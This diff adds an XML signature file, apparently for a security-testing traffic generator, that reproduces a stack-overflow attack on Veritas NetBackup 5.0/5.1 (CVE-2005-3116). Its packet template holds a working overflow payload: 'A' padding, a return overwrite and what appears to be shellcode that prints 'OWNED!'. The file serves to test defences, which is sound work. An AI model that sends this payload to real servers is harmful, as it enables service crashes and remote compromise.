@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Veritas NetBackup Stack Overflow"/>
+    <EngDesc display="true" value="This threat sends a malicious packet to the NetBackup daemon leading to a stack overflow. NetBackup is an ftp server that typically listens on port 13701."/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Veritas"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Veritas_NetBackup"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Veritas_NetBackup_5.0"/>
+      <item value="Veritas_NetBackup_5.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.idefense.com/intelligence/vulnerabilities/display.php?id=336"/>
+    <CVEID display="true" value="CVE-2005-3116"/>
+    <bugtraqID display="true" value="15353"/>
+    <OSVDB display="true" value=" 20674"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="00000108dbe98fcc00c000a80001003c0940ad94"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632769434579687500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1141449021" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="61414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414242424242424242C1EC0CC1E40C33DB5343534353BB88724400FF138BF833DBB31653BB60F312005357BB4C724400FF138BD480C60133DB5343C1E310535257BB34724400FF138BD480C601FFE24F574E45442168F3120000F01200" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
